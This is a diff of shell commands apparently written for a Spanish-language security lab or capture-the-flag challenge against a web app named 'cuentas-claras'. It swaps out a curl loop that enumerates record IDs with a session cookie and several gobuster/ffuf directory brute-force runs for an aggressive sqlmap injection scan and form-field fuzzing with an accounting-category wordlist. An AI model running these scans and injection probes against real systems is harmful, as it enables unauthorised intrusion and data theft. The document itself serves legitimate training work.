@@ -1,19 +1,8 @@
-COOKIE='session=eyJ...PEGÁ_TU_SESSION_COMPLETA'
 BASE='https://chl-3080b01d-bb9c-4e54-bf7f-06f64c3e6d9a-cuentas-claras.b.softwareseguro.com.ar'
-for id in $(seq 1 60); do
-  # sigue el redirect y captura el mensaje "Proveedor #X: N movimientos"
-  r=$(curl -s -b "$COOKIE" -L -X POST "$BASE/movimientos/$id" | grep -oiE "Proveedor #[0-9]+:[^<]*movimientos[^<]*")
-  [ -n "$r" ] && echo "id=$id -> $r"
-done
-
+sqlmap -u "$BASE/movimientos/1" --method=POST --batch --level=5 --risk=3 --dbms=sqlite --threads=4
 
 BASE='https://chl-3080b01d-bb9c-4e54-bf7f-06f64c3e6d9a-cuentas-claras.b.softwareseguro.com.ar'
-ffuf -u "$BASE/FUZZ" -w /usr/share/wordlists/dirb/common.txt -fc 404 -t 40
+# wordlist de categorías contables en español
+printf 'Sueldos\nSalarios\nImpuestos\nTributos\nLegales\nJuridico\nJudicial\nFinanzas\nBancos\nCreditos\nPrestamos\nInversiones\nDividendos\nIntereses\nHonorarios\nAlquileres\nSeguros\nAmortizaciones\nProvisiones\nReservas\nNomina\nRRHH\nRecursos\nGastos\nCaja\nTesoreria\nContabilidad\nAuditoria\nDirectorio\nGerencia\nConfidencial\nReservado\nInterno\nVarios\nOtros\nComisiones\nViajes\nRepresentacion\nDonaciones\nMultas\nSanciones\nIndemnizaciones\nBonos\nAguinaldo\nVacaciones\nRetenciones\nIVA\nGanancias\nPatrimonio\nCapital\nUtilidades\nPerdidas\nIngresos\nEgresos\nVentas\nCompras\nProduccion\nMateriales\nServiciosPublicos\nEnergiaElectrica' > ~/cats.txt
 
-
-BASE='https://chl-3080b01d-bb9c-4e54-bf7f-06f64c3e6d9a-cuentas-claras.b.softwareseguro.com.ar'
-gobuster dir -u "$BASE" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 404 -t 50
-
-
-BASE='https://chl-3080b01d-bb9c-4e54-bf7f-06f64c3e6d9a-cuentas-claras.b.softwareseguro.com.ar'
-gobuster dir -u "$BASE" -w /usr/share/wordlists/dirb/common.txt -b 404,502 -t 5
+ffuf -u "$BASE/alta" -X POST -d "nombre=x&categoria=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -w ~/cats.txt -mc all -ac -t 10
